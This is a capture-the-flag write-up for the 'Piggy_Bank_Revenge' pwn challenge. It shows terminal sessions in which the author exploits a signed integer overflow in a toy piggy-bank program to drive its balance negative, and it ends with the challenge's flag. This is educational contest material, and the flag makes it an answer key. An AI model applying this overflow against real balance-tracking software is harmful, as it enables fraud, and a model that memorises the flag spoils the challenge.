# Piggy_Bank_Revenge

539, PWN, 51 SOLVES

### Description

Seems there was an issue with the previous implementation. I've introduced a HOTFIX that should prevent any further vulnerabilities. I've achieved an unhackable piggy bank now for sure.

nc chals.whitehacks.ctf.sg 20201

This will require a bit more knowledge about programming than Piggy Bank. Give it a try and learn something new(?)

### Attached Files
revenge
revenge.c

## Solution

### Integer overflow

Since the deposit/withdraw value is stored as an integer, I started thinking about Integer overflows

We know the maximum value a C integer can hold is 2147483647

What if we tried putting in the maximum value?

Firstly I tried clearing the piggy bank value
```
Piggy Bank value: $1337.00
Wallet value:     $100.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 2

How much would you like to WITHDRAW?
> $1336

Piggy Bank value: $1.00
Wallet value:     $1436.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit
```

And then I experimented with the maximum integer value
```
Your choice: 1

How much would you like to DEPOSIT?
> $2147483647

Piggy Bank value: $0.00
Wallet value:     $1437.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 1

How much would you like to DEPOSIT?
> $2147483647

Piggy Bank value: $-1.00
Wallet value:     $1438.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit
```

Ooh seems promising to have negative Piggy bank values. Let's test some more.

```
Your choice: 1

How much would you like to DEPOSIT?
> $2147483648
[-] Error: No negative values!

Piggy Bank value: $-1.00
Wallet value:     $1438.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 1

How much would you like to DEPOSIT?
> $2147483646

Piggy Bank value: $-3.00
Wallet value:     $1440.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice:
```

With this we know that we can subtract a significant value from the piggy bank at once


### Scripting and Final Result

I coded a python script (`solve.py`) to put in the payload

```
[*] Switching to interactive mode
How much would you like to WITHDRAW?
> $
Piggy Bank value: $1.00
Wallet value:     $1436.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice:
How much would you like to DEPOSIT?
> $
Piggy Bank value: $-31337.00
Wallet value:     $32774.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice:
WH2021{(Don't)Try_th1s_0n_youR_B4nk!}
[*] Got EOF while reading in interactive
$           
```

# Flag
`WH2021{(Don't)Try_th1s_0n_youR_B4nk!}`